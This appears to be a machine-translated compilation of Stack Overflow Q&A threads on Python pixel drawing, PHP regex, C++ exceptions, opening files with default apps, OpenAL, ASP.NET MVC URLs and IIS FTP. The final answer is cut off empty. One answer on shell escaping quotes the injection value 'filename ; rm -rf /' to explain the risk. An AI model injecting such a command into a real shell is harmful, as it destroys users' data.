> 时间：2009-01-12T16:20:57.640

如果您有`numpy`并且`scipy`可用（并且如果您在 Python 中操作大型数组，我会推荐它们），那么该[`scipy.misc.pilutil.toimage`](https://docs.scipy.org/doc/scipy/reference/generated/scipy.misc.toimage.html)函数非常方便。一个简单的例子：

```
import numpy as np
import scipy.misc as smp

# Create a 1024x1024x3 array of 8 bit unsigned integers
data = np.zeros( (1024,1024,3), dtype=np.uint8 )

data[512,512] = [254,0,0]       # Makes the middle pixel red
data[512,513] = [0,0,255]       # Makes the next pixel blue

img = smp.toimage( data )       # Create a PIL image
img.show()                      # View in default viewer 
```

好处是可以很好`toimage`地处理不同的数据类型，因此浮点数的 2D 数组可以明智地转换为灰度等。

您可以从[这里](https://www.scipy.org/scipylib/download.html)下载`numpy`和。或使用点子：`scipy`

```
pip install numpy scipy 
```

* * *

## 回答 #2

> 赞同：21
> 
> 时间：2009-01-12T11:57:48.857

```
import Image
im= Image.new('RGB', (1024, 1024))
im.putdata([(255,0,0), (0,255,0), (0,0,255)])
im.save('test.png') 
```

在图像的左上角放置一个红色、绿色和蓝色像素。

`im.fromstring()`如果您更喜欢处理字节值，则速度更快。

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2018-01-24T20:11:45.050

### 要求

对于这个例子，安装[Numpy](https://scipy.org/install.html)和[Pillow](http://pillow.readthedocs.io/en/3.1.x/installation.html)。

### 例子

目标是首先将您要创建的图像表示为 3 个 (RGB) 数字集的数组数组 - 使用 Numpy's [`array()`](https://docs.scipy.org/doc/numpy-1.13.0/reference/generated/numpy.array.html)，以提高性能和简单性：

```
import numpy

data = numpy.zeros((1024, 1024, 3), dtype=numpy.uint8) 
```

现在，将中间 3 个像素的 RGB 值设置为红色、绿色和蓝色：

```
data[512, 511] = [255, 0, 0]
data[512, 512] = [0, 255, 0]
data[512, 513] = [0, 0, 255] 
```

然后，使用 Pillow[`Image.fromarray()`](http://pillow.readthedocs.io/en/3.1.x/reference/Image.html#PIL.Image.fromarray)从数组中生成图像：

```
from PIL import Image

image = Image.fromarray(data) 
```

现在，“显示”图像（在 OS X 上，这将在预览中将其作为临时文件打开）：

```
image.show() 
```

### 笔记

这个答案的灵感来自 BADCODE 的答案，它太过时了，无法使用，也太不同了，无法在不完全重写的情况下简单地更新。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2018-07-30T23:58:13.947

另一种方法是使用[Pyxel ，这是 Python3](https://github.com/kitao/pyxel)[中 TIC-80 API](https://github.com/nesbox/TIC-80)的开源实现（TIC-80 是开源 PICO-8）。

这是一个完整的应用程序，它只在黑色背景上绘制一个黄色像素：

```
import pyxel

def update():

    """This function just maps the Q key to `pyxel.quit`,
    which works just like `sys.exit`."""

    if pyxel.btnp(pyxel.KEY_Q): pyxel.quit()

def draw():

    """This function clears the screen and draws a single
    pixel, whenever the buffer needs updating. Note that
    colors are specified as palette indexes (0-15)."""

    pyxel.cls(0)            # clear screen (color)
    pyxel.pix(10, 10, 10)   # blit a pixel (x, y, color)

pyxel.init(160, 120)        # initilize gui (width, height)
pyxel.run(update, draw)     # run the game  (*callbacks) 
```

**注意**：该库最多只允许 16 种颜色，但您可以更改哪些颜色，并且您可能无需太多工作就可以支持更多颜色。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-01-12T08:35:27.130

我认为您使用 PIL 在磁盘上生成图像文件，然后使用图像阅读器软件加载它。

您应该通过直接在内存中渲染图片来获得小的速度提升（您将节省将图像写入磁盘然后重新加载它的成本）。查看此线程[https://stackoverflow.com/questions/326300/python-best-library-for-drawing](https://stackoverflow.com/questions/326300/python-best-library-for-drawing)，了解如何使用各种 python 模块渲染该图像。

我会亲自尝试 wxpython 和**dc.DrawBitmap**函数。如果您使用这样的模块而不是外部图像阅读器，您将获得很多好处：

*   速度
*   您将能够创建带有参数按钮的交互式用户界面。
*   您将能够轻松地对 Zoomin 和 Zoomout 功能进行编程
*   您将能够在计算时绘制图像，如果计算需要大量时间，这将非常有用

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2021-02-28T05:05:17.357

`turtle`如果您不想安装外部模块，可以使用该模块。我创建了一些有用的功能：

*   `setwindowsize( x,y )`- 将窗口大小设置为 x*y
*   `drawpixel( x, y, (r,g,b), pixelsize)`- 使用 RGB 颜色（元组）将像素绘制到 x:y 坐标，具有像素大小的厚度
*   `showimage()`- 显示图像

```
import turtle

def setwindowsize(x=640, y=640):
    turtle.setup(x, y)
    turtle.setworldcoordinates(0,0,x,y)

def drawpixel(x, y, color, pixelsize = 1 ):
    turtle.tracer(0, 0)
    turtle.colormode(255)
    turtle.penup()
    turtle.setpos(x*pixelsize,y*pixelsize)
    turtle.color(color)
    turtle.pendown()
    turtle.begin_fill()
    for i in range(4):
        turtle.forward(pixelsize)
        turtle.right(90)
    turtle.end_fill()

def showimage():
    turtle.hideturtle()
    turtle.update() 
```

例子：

**200x200 窗口，中心 1 个红色像素**

```
setwindowsize(200, 200)
drawpixel(100, 100, (255,0,0) )
showimage() 
```

[![在此处输入图像描述](https://i.stack.imgur.com/2fV7U.png)](https://i.stack.imgur.com/2fV7U.png)

**30x30 随机颜色。像素大小：10**

```
from random import *

setwindowsize(300,300)

for x in range(30):
    for y in range(30):
        color = (randint(0,255),randint(0,255),randint(0,255))
        drawpixel(x,y,color,10)

showimage() 
```

[![在此处输入图像描述](https://i.stack.imgur.com/Dlda5.png)](https://i.stack.imgur.com/Dlda5.png)

# php - 从字符串中获取 XHTML 标记的内容：p、ul 和/或 ol

> ID：434585
> 
> 赞同：0
> 
> 时间：2009-01-12T06:09:12.180
> 
> 标签：php, regex

我有一个带有所见即所得编辑器的 CMS，它可以生成非常好的 xhtml。基于这一事实，我认为 HTML 解析器对于这项小工作来说可能有点矫枉过正。

我打算使用正则表达式，但到目前为止一直无法让我的匹配我所追求的。

我正在使用 PHP5。

我需要匹配所见即所得编辑器能够生成的 3 个块级元素的内容：p、ul 和 ol。我目前正在使用 preg_match_all() 。

有人可以帮助我吗？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-01-12T06:21:56.213

只要您没有嵌套的 p/ul/ol 标签，这应该可以工作：

```
preg_match_all("<(?:p|ul|ol)>(.*?)</(?:p|ul|ol)>", $string, $matches) 
```

`?:`防止括号中的任何内容被包含在内，`$matches`并`.*?`防止正则表达式匹配到另一个标签的末尾。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-01-12T06:14:37.943

我想我刚刚想通了

```
preg_match_all('/<(p|ul|ol)>(.*)<\/(p|ul|ol)>/iU', $content, $blockElements); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-12T07:05:26.513

只要您不在 p 标签中嵌套 p 标签或在 ul 中嵌套 ul，这将找到每个标签的最顶部。但是例如，您可以将 p 嵌套在 ul 中。对于复杂的 html，你最好使用[DOM](http://no2.php.net/manual/en/book.dom.php)。

示例数据：

```
$html = <<< EOF
<p>
 hey
</p>

<ul>
 <li>
  test 
 </li>
 <li>
  <p>
   df4r4 4f4
  </p>
 </li>
</ul>

<p>
 hoo
</p>

EOF; 
```

正则表达式：

```
$regex = '#<(?P<tags>(?i)p|ul|ol)>(?P<values>.*?)</\1>#si';
preg_match_all($regex, $html, $output); 
```

按标签排序：

```
for ($i = 0, $t = count($output['tags']); $i < $t; $i++) {
    $out[$output['tags'][$i]][] = $output['values'][$i];
} 
```

标签和值分开，用整数键和整行匹配删除重复项：

```
$output = array_intersect_key($output, array('tags' => 0, 'values' => 0)); 
```

# c++ - 创建从 std::exception 派生的用户异常？

> ID：434592
> 
> 赞同：4
> 
> 时间：2009-01-12T06:17:04.460
> 
> 标签：c++, exception

如何从标准异常创建用户异常类？

解决以下情况假设我有一个类，其中包含一些指示对象类型的枚举

所以根据类型，成员函数是可用的。调用不可用的成员函数应该抛出异常。同样，当再次调用未初始化的 getter 时，应该抛出异常（我使用默认参数来检查未初始化的对象）。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2009-01-12T06:54:10.470

您可能应该从 std::runtime_error 或其他标准异常之一（参见 <stdexcept>）而不是直接从 std::exception 派生。除了描述究竟发生了什么之外，它还正确定义了 what() 方法。

此外，通常最好为每个问题定义不同的异常，而不是使用枚举。这允许 try catch 机制捕获适当的问题，但这完全取决于您的具体情况，如果没有进一步的信息，很难知道。

```
class myException: public std::runtime_error
{
    public:
        myException(std::string const& msg):
            std::runtime_error(msg)
        {}
}; 
```

但：

```
so based on type, member functions are available.Calling member function
that is not available should throw an exception. 
```

这闻起来很有趣（就像 Martin Fowler Smell 一样（查看他的书））。

# python - 在 Windows 和 Mac OS 中使用 Python 中的默认 OS 应用程序打开文档

> ID：434597
> 
> 赞同：153
> 
> 时间：2009-01-12T06:23:51.247
> 
> 标签：python, windows, macos

我需要能够在 Windows 和 Mac OS 中使用其默认应用程序打开文档。基本上，我想做与在资源管理器或 Finder 中双击文档图标时发生的相同的事情。在 Python 中执行此操作的最佳方法是什么？

* * *

## 回答 #1

> 赞同：185
> 
> 时间：2009-01-12T15:00:22.030

使用`subprocess`Python 2.4+ 上可用的模块，而不是`os.system()`，因此您不必处理 shell 转义。

```
import subprocess, os, platform
if platform.system() == 'Darwin':       # macOS
    subprocess.call(('open', filepath))
elif platform.system() == 'Windows':    # Windows
    os.startfile(filepath)
else:                                   # linux variants
    subprocess.call(('xdg-open', filepath)) 
```

双括号是因为`subprocess.call()`想要一个序列作为它的第一个参数，所以我们在这里使用一个元组。在带有 Gnome 的 Linux 系统上，还有一个`gnome-open`命令可以做同样的事情，但`xdg-open`它是 Free Desktop Foundation 标准并且可以在 Linux 桌面环境中工作。

* * *

## 回答 #2

> 赞同：94
> 
> 时间：2009-01-12T06:30:20.580

`open`并且`start`分别是 Mac OS/X 和 Windows 的命令解释器，用于执行此操作。

要从 Python 调用它们，您可以使用`subprocess`module 或`os.system()`.

以下是使用哪个包的注意事项：

1.  您可以通过 调用它们`os.system`，这可行，但是...

    **转义：** `os.system`仅适用于路径名中没有任何空格或其他 shell 元字符的文件名（例如`A:\abc\def\a.txt`），否则需要转义。`shlex.quote`类 Unix 系统有，但 Windows 没有真正的标准。也许还可以看到[python, windows : parsing commandlines with shlex](https://stackoverflow.com/questions/33560364/python-windows-parsing-command-lines-with-shlex)

    *   macOS/X:`os.system("open " + shlex.quote(filename))`
    *   Windows：`os.system("start " + filename)`正确地说`filename`也应该被转义。
2.  您也可以通过`subprocess`模块调用它们，但是...

    对于 Python 2.7 及更高版本，只需使用

    ```
    subprocess.check_call(['open', filename]) 
    ```

    在 Python 3.5+ 中，您可以等效地使用稍微复杂但也更通用的

    ```
    subprocess.run(['open', filename], check=True) 
    ```

    如果您需要一直兼容到 Python 2.4，您可以使用`subprocess.call()`并实现自己的错误检查：

    ```
    try:
        retcode = subprocess.call("open " + filename, shell=True)
        if retcode < 0:
            print >>sys.stderr, "Child was terminated by signal", -retcode
        else:
            print >>sys.stderr, "Child returned", retcode
    except OSError, e:
        print >>sys.stderr, "Execution failed:", e 
    ```

    现在，使用 有什么好处`subprocess`？

    *   **安全性：**理论上，这更安全，但实际上我们需要以一种或另一种方式执行命令行；在任一环境中，我们都需要环境和服务来解释、获取路径等。在这两种情况下，我们都不会执行任意文本，因此它没有固有的“但您可以键入`'filename ; rm -rf /'`”问题，并且**如果**文件名可能被损坏，则使用`subprocess.call`给我们几乎没有额外的保护。
    *   **错误处理：**它实际上并没有给我们更多的错误检测，我们仍然依赖`retcode`于任何一种情况；但是在发生错误的情况下显式引发异常的行为肯定会帮助您注意到是否有故障（尽管在某些情况下，回溯可能根本没有比简单地忽略错误更有帮助）。
    *   **产生一个（非阻塞）子**进程：我们不需要等待子进程，因为我们是通过问题陈述启动一个单独的进程。

    反对“但是`subprocess`是首选”的反对意见。然而，`os.system()`它并没有被弃用，在某种意义上，它是完成这项特定工作的最简单的工具。结论：`os.system()`因此使用也是一个正确的答案。

    一个显着的**缺点**是 Windows`start`命令*要求*您传入`shell=True`这否定了使用`subprocess`.

* * *

## 回答 #3

> 赞同：52
> 
> 时间：2009-01-12T12:33:39.253

我更喜欢：

```
os.startfile(path, 'open') 
```

请注意，此模块支持在其文件夹和文件中包含空格的文件名，例如

```
A:\abc\folder with spaces\file with-spaces.txt 
```

( [python docs](http://docs.python.org/library/os.html#os.startfile) ) 'open' 不必添加（这是默认设置）。文档特别提到这就像在 Windows 资源管理器中双击文件的图标。

此解决方案仅适用于 Windows。

* * *

## 回答 #4

> 赞同：41
> 
> 时间：2009-01-12T14:47:09.780

只是为了完整性（这不是问题），[xdg-open](https://portland.freedesktop.org/doc/xdg-open.html)将在 Linux 上执行相同的操作。

* * *

## 回答 #5

> 赞同：26
> 
> 时间：2009-01-12T15:28:07.200

```
import os
import subprocess

def click_on_file(filename):
    '''Open document with default application in Python.'''
    try:
        os.startfile(filename)
    except AttributeError:
        subprocess.call(['open', filename]) 
```

* * *

## 回答 #6

> 赞同：24
> 
> 时间：2012-07-13T22:19:01.847

如果您必须使用启发式方法，您可以考虑`webbrowser`.
它是标准库，尽管它的名字它也会尝试打开文件：

> 请注意，在某些平台上，尝试使用此函数打开文件名可能会起作用并启动操作系统的关联程序。但是，这既不支持也不可移植。（[参考](http://docs.python.org/library/webbrowser.html#webbrowser.open)）

我尝试了这段代码，它在 Windows 7 和 Ubuntu Natty 中运行良好：

```
import webbrowser
webbrowser.open("path_to_file") 
```

此代码在使用 Internet Explorer 8 的 Windows XP Professional 中也可以正常工作。

* * *

## 回答 #7

> 赞同：7
> 
> 时间：2009-10-18T19:48:10.853

如果你想走这`subprocess.call()`条路，它在 Windows 上应该是这样的：

```
import subprocess
subprocess.call(('cmd', '/C', 'start', '', FILE_NAME)) 
```

你不能只使用：

```
subprocess.call(('start', FILE_NAME)) 
```

因为`start` [不是可执行文件](http://frank.neatstep.com/node/84)，而是`cmd.exe`程序的命令。这有效：

```
subprocess.call(('cmd', '/C', 'start', FILE_NAME)) 
```

但前提是 FILE_NAME 中没有空格。

虽然`subprocess.call`方法~~en~~正确引用了参数，但该`start`命令的语法相当奇怪，其中：

```
start notes.txt 
```

除了：

```
start "notes.txt" 
```

第一个带引号的字符串应该设置窗口的标题。为了使它与空间一起工作，我们必须这样做：

```
start "" "my notes.txt" 
```

这就是顶部代码的作用。

* * *

## 回答 #8

> 赞同：5
> 
> 时间：2010-08-05T09:22:42.663

Start 不支持长路径名和空格。您必须将其转换为 8.3 兼容路径。

```
import subprocess
import win32api

filename = "C:\\Documents and Settings\\user\\Desktop\file.avi"
filename_short = win32api.GetShortPathName(filename)

subprocess.Popen('start ' + filename_short, shell=True ) 
```

该文件必须存在才能使用 API 调用。

* * *

## 回答 #9

> 赞同：5
> 
> 时间：2014-07-22T18:32:40.100

`os.startfile(path, 'open')`在windows下是好的，因为当目录中有空格时，`os.system('start', path_name)`无法正确打开应用程序，当目录中存在i18n时，`os.system`需要将unicode更改为windows中控制台的编解码器。

* * *

## 回答 #10

> 赞同：3
> 
> 时间：2011-08-31T00:18:02.750

我已经很晚了，但这里有一个使用 windows api 的解决方案。这总是会打开相关的应用程序。

```
import ctypes

shell32 = ctypes.windll.shell32
file = 'somedocument.doc'

shell32.ShellExecuteA(0,"open",file,0,0,5) 
```

很多魔法常数。第一个零是当前程序的 hwnd。可以为零。其他两个零是可选参数（参数和目录）。5 == SW_SHOW，它指定如何执行应用程序。阅读 [ShellExecute API 文档](http://msdn.microsoft.com/en-us/library/bb762153%28v=vs.85%29.aspx)以获取更多信息。

* * *

## 回答 #11

> 赞同：2
> 
> 时间：2009-01-12T06:34:06.343

在 mac os 上，您可以调用`open`：

```
import os
os.open("open myfile.txt") 
```

这将使用 TextEdit 打开文件，或者任何应用程序设置为此文件类型的默认值。

* * *

## 回答 #12

> 赞同：2
> 
> 时间：2009-05-03T21:46:36.087

如果要指定应用程序在 Mac OS X 上打开文件，请使用： `os.system("open -a [app name] [file name]")`

* * *

## 回答 #13

> 赞同：2
> 
> 时间：2015-03-21T15:41:48.333

在 Windows 8.1 上，以下已经有效，而其他给定`subprocess.call`的路径失败的方式中有空格。

```
subprocess.call('cmd /c start "" "any file path with spaces"') 
```

通过利用这个和其他人的答案，这是一个适用于多个平台的内联代码。

```
import sys, os, subprocess
subprocess.call(('cmd /c start "" "'+ filepath +'"') if os.name is 'nt' else ('open' if sys.platform.startswith('darwin') else 'xdg-open', filepath)) 
```

* * *

## 回答 #14

> 赞同：2
> 
> 时间：2021-08-19T05:57:18.273

这是 Nick 的答案，针对 WSL 稍作调整：

```
import os
import sys
import logging
import subprocess

def get_platform():
    if sys.platform == 'linux':
        try:
            proc_version = open('/proc/version').read()
            if 'Microsoft' in proc_version:
                return 'wsl'
        except:
            pass
    return sys.platform

def open_with_default_app(filename):
    platform = get_platform()
    if platform == 'darwin':
        subprocess.call(('open', filename))
    elif platform in ['win64', 'win32']:
        os.startfile(filename.replace('/','\\'))
    elif platform == 'wsl':
        subprocess.call('cmd.exe /C start'.split() + [filename])
    else:                                   # linux variants
        subprocess.call(('xdg-open', filename)) 
```

* * *

## 回答 #15

> 赞同：0
> 
> 时间：2022-01-15T16:25:42.840

我想你可能想在编辑器中打开文件。

对于 Windows

```
subprocess.Popen(["notepad", filename]) 
```

对于 Linux

```
subprocess.Popen(["text-editor", filename]) 
```

# audio - 一个人如何多次跳转到特定的偏移量？

> ID：434599
> 
> 赞同：2
> 
> 时间：2009-01-12T06:23:57.987
> 
> 标签：audio, offset, openal

想象一下这个函数：

```
void SoundManager::playSource(ALuint sourceID, float offset)
{
    alSourceStop(sourceID);

    ALint iTotal = 0;
    ALint iCurrent = 0;
    ALint uiBuffer = 0;
    alGetSourcei(sourceID, AL_BUFFER, &uiBuffer);
    alGetBufferi(uiBuffer, AL_SIZE, &iTotal);
    iCurrent = iTotal * offset;

    alSourcei(sourceID, AL_BYTE_OFFSET, iCurrent);
    alSourcePlay(sourceID);
} 
```

这个想法是调用`playSource(x, 0.5f)`会跳转到（大约）缓冲区的一半，等等。

我第一次调用它时它工作正常，但如果我在同一个源上再次调用它（无论该源是否正在播放）它开始播放就好像我用偏移量 0 调用它一样。

任何想法为什么？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2009-01-12T07:08:22.500

解决了！

尽管 API 声称设置偏移量适用于任何状态的源，但问题是我应该在开始时调用`alSourceRewind`而不是调用`alSourceStop`。

似乎设置偏移量仅适用于该`AL_INITIAL`州的来源。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-04-30T11:38:34.873

你可以先播放音频文件，然后`setOffset`像这样调用，不需要调用`alSourcePlay`：

```
- (BOOL)setOffset:(float)offset
{
  ALint iTotal = 0;
  ALint iCurrent = 0;
  ALint uiBuffer = 0;
  alGetSourcei(_sourceID, AL_BUFFER, &uiBuffer);
  alGetBufferi(uiBuffer, AL_SIZE, &iTotal);
  iCurrent = iTotal * offset;
  alSourcei(_sourceID, AL_BYTE_OFFSET, iCurrent);
  return ((_error = alGetError()) != AL_NO_ERROR);
} 
```

# vb.net - 波形音频缓冲区

> ID：434601
> 
> 赞同：1
> 
> 时间：2009-01-12T06:25:43.647
> 
> 标签：vb.net

我在 msdn Recording and Playing Sound with the Waveform Audio Interface 中查看了这篇文章，并下载了使用 wave in 和 wave out 进行录制的 P/Invoke 库示例。我如何在录制时从缓冲区（波形音频接口）（输入）获取数据，并使用 c# 或 vb（输出）进行播放，谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-03-13T10:49:05.487

您可以尝试使用[NAudio](http://naudio.codeplex.com/ "南音频")库，它会为您解决这个问题。

# asp.net-mvc - 如何在 ASP.NET MVC 中找到操作的绝对 url？

> ID：434604
> 
> 赞同：249
> 
> 时间：2009-01-12T06:26:44.237
> 
> 标签：asp.net-mvc

我需要做这样的事情：

```
<script type="text/javascript">
    token_url = "http://example.com/your_token_url";
</script> 
```

我正在使用 MVC 的 Beta 版本，但我不知道如何获取操作的绝对 url。我想做这样的事情：

```
<%= Url.AbsoluteAction("Action","Controller")) %> 
```

是否有帮助程序或 Page 方法？

* * *

## 回答 #1

> 赞同：497
> 
> 时间：2010-06-18T02:54:39.850

单击[此处](http://www.captaincodeman.com/2010/02/03/absolute-urls-using-mvc-without-extension-methods/)了解更多信息，但本质上不需要扩展方法。它已经被烘焙了，只是不是以一种非常直观的方式。

```
Url.Action("Action", null, null, Request.Url.Scheme); 
```

* * *

## 回答 #2

> 赞同：74
> 
> 时间：2009-01-12T10:26:04.830

扩展 UrlHelper

```
namespace System.Web.Mvc
{
    public static class HtmlExtensions
    {
        public static string AbsoluteAction(this UrlHelper url, string action, string controller)
        {
            Uri requestUrl = url.RequestContext.HttpContext.Request.Url;

            string absoluteAction = string.Format(
                "{0}://{1}{2}",
                requestUrl.Scheme,
                requestUrl.Authority,
                url.Action(action, controller));

            return absoluteAction;
        }
    }
} 
```

然后像这样调用它

```
<%= Url.AbsoluteAction("Dashboard", "Account")%> 
```

编辑 - RESHARPER 注释

对已接受答案的最高评价是`This answer is the better one, this way Resharper can still validate that the Action and Controller exists.`因此，这是一个示例，您如何获得相同的行为。

```
using JetBrains.Annotations

namespace System.Web.Mvc
{
    public static class HtmlExtensions
    {
        public static string AbsoluteAction(
            this UrlHelper url,
            [AspMvcAction]
            string action,
            [AspMvcController]
            string controller)
        {
            Uri requestUrl = url.RequestContext.HttpContext.Request.Url;

            string absoluteAction = string.Format(
                "{0}://{1}{2}",
                requestUrl.Scheme,
                requestUrl.Authority,
                url.Action(action, controller));

            return absoluteAction;
        }
    }
} 
```

支持资料：

*   [为 ASP.NET MVC 中的自定义助手提供智能感知、导航等](https://blog.jetbrains.com/dotnet/2011/12/07/providing-intellisense-navigation-and-more-for-custom-helpers-in-aspnet-mvc/)

* * *

## 回答 #3

> 赞同：26
> 
> 时间：2010-07-02T19:23:31.480

```
<%= Url.Action("About", "Home", null, Request.Url.Scheme) %>
<%= Url.RouteUrl("Default", new { Action = "About" }, Request.Url.Scheme) %> 
```

* * *

## 回答 #4

> 赞同：21
> 
> 时间：2009-03-17T15:01:18.057

使用@Charlino 的答案作为指导，我想出了这个。

UrlHelper的[ASP.NET MVC 文档](http://msdn.microsoft.com/en-us/library/system.web.mvc.urlhelper.aspx)显示，如果传入主机名和协议，Url.Action 将返回一个完全限定的 Url。我创建了这些帮助程序来强制提供主机名和协议。多个重载反映了 Url.Action 的重载：

```
using System.Web.Routing;

namespace System.Web.Mvc {
    public static class HtmlExtensions {

        public static string AbsoluteAction(this UrlHelper url, string actionName) {
            Uri requestUrl = url.RequestContext.HttpContext.Request.Url;
            return url.Action(actionName, null, (RouteValueDictionary)null, 
                              requestUrl.Scheme, null);
        }

        public static string AbsoluteAction(this UrlHelper url, string actionName, 
                                            object routeValues) {
            Uri requestUrl = url.RequestContext.HttpContext.Request.Url;
            return url.Action(actionName, null, new RouteValueDictionary(routeValues), 
                              requestUrl.Scheme, null);
        }

        public static string AbsoluteAction(this UrlHelper url, string actionName, 
                                            RouteValueDictionary routeValues) {
            Uri requestUrl = url.RequestContext.HttpContext.Request.Url;
            return url.Action(actionName, null, routeValues, requestUrl.Scheme, null);
        }

        public static string AbsoluteAction(this UrlHelper url, string actionName, 
                                            string controllerName) {
            Uri requestUrl = url.RequestContext.HttpContext.Request.Url;
            return url.Action(actionName, controllerName, (RouteValueDictionary)null, 
                              requestUrl.Scheme, null);
        }

        public static string AbsoluteAction(this UrlHelper url, string actionName, 
                                            string controllerName, 
                                            object routeValues) {
            Uri requestUrl = url.RequestContext.HttpContext.Request.Url;
            return url.Action(actionName, controllerName, 
                              new RouteValueDictionary(routeValues), requestUrl.Scheme, 
                              null);
        }

        public static string AbsoluteAction(this UrlHelper url, string actionName, 
                                            string controllerName, 
                                            RouteValueDictionary routeValues) {
            Uri requestUrl = url.RequestContext.HttpContext.Request.Url;
            return url.Action(actionName, controllerName, routeValues, requestUrl.Scheme, 
                              null);
        }

        public static string AbsoluteAction(this UrlHelper url, string actionName, 
                                            string controllerName, object routeValues, 
                                            string protocol) {
            Uri requestUrl = url.RequestContext.HttpContext.Request.Url;
            return url.Action(actionName, controllerName, 
                              new RouteValueDictionary(routeValues), protocol, null);
        }

    }
} 
```

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2009-01-12T10:18:24.300

我不确定是否有内置的方法可以做到这一点，但您可以推出自己的 HtmlHelper 方法。

类似于以下内容

```
namespace System.Web.Mvc
{
    public static class HtmlExtensions
    {
        public static string AbsoluteAction(this HtmlHelper html, string actionUrl)
        {
            Uri requestUrl = html.ViewContext.HttpContext.Request.Url;

            string absoluteAction = string.Format("{0}://{1}{2}",
                                                  requestUrl.Scheme,
                                                  requestUrl.Authority,
                                                  actionUrl);

            return absoluteAction;
        }
    }
} 
```

然后像这样调用它

```
<%= Html.AbsoluteAction(Url.Action("Dashboard", "Account"))%> » 
```

HTH，查尔斯

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2018-01-17T07:42:24.713

带参数的完整答案是：

```
var url = Url.Action("ActionName", "ControllerName", new { id = "arg_value" }, Request.Url.Scheme); 
```

这将产生一个绝对网址

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2009-01-12T18:52:49.473

结果相同，但更简洁（没有字符串连接/格式化）：

```
public static Uri GetBaseUrl(this UrlHelper url)
{
    Uri contextUri = new Uri(url.RequestContext.HttpContext.Request.Url, url.RequestContext.HttpContext.Request.RawUrl);
    UriBuilder realmUri = new UriBuilder(contextUri) { Path = url.RequestContext.HttpContext.Request.ApplicationPath, Query = null, Fragment = null };
    return realmUri.Uri;
}

public static string ActionAbsolute(this UrlHelper url, string actionName, string controllerName)
{
    return new Uri(GetBaseUrl(url), url.Action(actionName, controllerName)).AbsoluteUri;
} 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2009-11-23T14:08:04.373

也许这个（？）：

```
<%= 
  Request.Url.GetLeftPart(UriPartial.Authority) + 
  Url.Action("Action1", "Controller2", new {param1="bla", param2="blabla" })
%> 
```

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2017-08-30T05:20:22.210

> env：dotnet 核心版本 1.0.4

```
Url.Action("Join",null, null,Context.Request.IsHttps?"https":"http"); 
```

# iis-6 - 在 Windows Server 2003 上设置被动 FTP (IIS6)

> ID：434608
> 
> 赞同：1
> 
> 时间：2009-01-12T06:27:36.060
> 
> 标签：iis-6, ftp

我在 IIS 6 上设置被动 FTP 时遇到问题。我使用了以下说明：[http ://www.velikan.net/iis-passive-ftp/](http://www.velikan.net/iis-passive-ftp/)

当我尝试通过 FTP 上传文件时，出现错误：

```
425 Can't open data connection. : /index.html 
```

有趣的是，从服务器上，我可以看到 index.html 文件已经创建，但文件大小设置为 0。

我正在使用 FireFTP 客户端。我打开了 1024-1048 的 FTP 被动端口。

有任何想法吗？谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-03-26T17:27:21.427

您是否设置了被动端口范围并打开了服务器和任何中间防火墙上的端口？（允许这些端口上从客户端到服务器的连接）

您是否允许本地防火墙中的端口/应用程序？（允许向外连接）

在 FTP 客户端日志中是否有时会显示 PASV？

创建文件的命令在端口 21 连接上发送，附加端口是数据端口。所以创建一个 0kb 的文件只是表明它不起作用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-10-20T20:40:26.467

几件事要检查-

1.  确保客户端正在建立 PASV 连接。在检索任何数据之前检查 ftp 客户端日志以查看是否正在发送 PASV 命令。
2.  FTP 被动端口不是 1024-1048，据我所知，服务器会随机选择 1024 以上的任何端口。

# asp.net-mvc - asp.net mvc - 我如何将本地文件路径字符串转换为 http url

> ID：434609
> 
> 赞同：2
> 
> 时间：2009-01-12T06:28:42.733
> 
> 标签：asp.net-mvc

保存上传文件后，我得到了这个文件的本地 url，我如何将它转换为 http url？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-01-12T06:36:43.420

```
public static string PathMap(string path)
{
    string approot = HttpContext.Current.Request.PhysicalApplicationPath.TrimEnd('\\');
    return path.Replace(approot, string.Empty).Replace('\\', '/');
} 
```

来源：[http ://www.aspapp.com/forums.asp?ForumId=11&TopicId=3536](http://www.aspapp.com/forums.asp?ForumId=11&TopicId=3536)

# web-services - 您推荐使用什么来以图形方式可视化 WSDL？

> ID：434617
> 
> 赞同：25
> 
> 时间：2009-01-12T06:36:18.150
> 
> 标签：web-services, soap, wsdl

我正在寻找一个很好的解决方案，以图形方式查看基于 SOAP 的 Web 服务并可能与其交互（用于测试目的）。在线（基于浏览器）解决方案也会很有趣。

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2009-01-12T06:38:51.000

试试这个（在线）WSDL 查看器：

[http://tomi.vanek.sk/](http://tomi.vanek.sk/)

* * *

## 回答 #2

> 赞同：17
> 
> 时间：2009-01-14T16:49:48.503

我已经将 Elipse WTP WSDL Editor 和 SoapUI 结合使用取得了成功。

Eclipse WTP WSDL 编辑器 - [http://wiki.eclipse.org/index.php/Introduction_to_the_WSDL_Editor](http://wiki.eclipse.org/index.php/Introduction_to_the_WSDL_Editor)

SoapUI - [http://www.soapui.org/](http://www.soapui.org/)

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2009-01-14T16:44:55.563

我过去曾成功使用过 SOAP UI：

[http://www.soapui.org/information/WSDL_Test.html?gclid=CMOpgKnAjpgCFRBbagodxyzOqg](http://www.soapui.org/information/WSDL_Test.html?gclid=CMOpgKnAjpgCFRBbagodxyzOqg)

它允许您测试方法并查看您的 WSDL 是否通过了当前标准。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-10-14T13:19:55.420

XMLSpy....没有什么比它更好 (^-^)

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2011-06-07T13:26:57.253

